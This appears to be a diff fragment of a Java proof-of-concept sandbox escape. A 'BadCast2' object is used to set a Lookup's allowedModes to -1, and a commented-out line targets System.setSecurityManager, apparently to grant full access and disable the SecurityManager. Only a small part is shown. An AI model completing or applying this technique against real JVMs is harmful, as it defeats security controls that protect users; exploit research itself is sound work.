@@ -22,10 +22,10 @@ public class Main {
                 e.lm.allowedModes = -1;
         }
 
-        public static void main(String[] args) throws Throwable {
+        public static void main(String[] args) {
                 BadCast2 e = new BadCast2();
                 handleEx(e);
-                MethodType metType = MethodType.methodType(System.class);
+                MethodType metType = MethodType.methodType(void.class);
                 // MethodType metType = MethodType.methodType(Object.class,Class.class, System.class);
 
                 // MethodHandle metHandle = MethodHandles.lookup().findStatic(System.class, "setSecurityManager", metType);
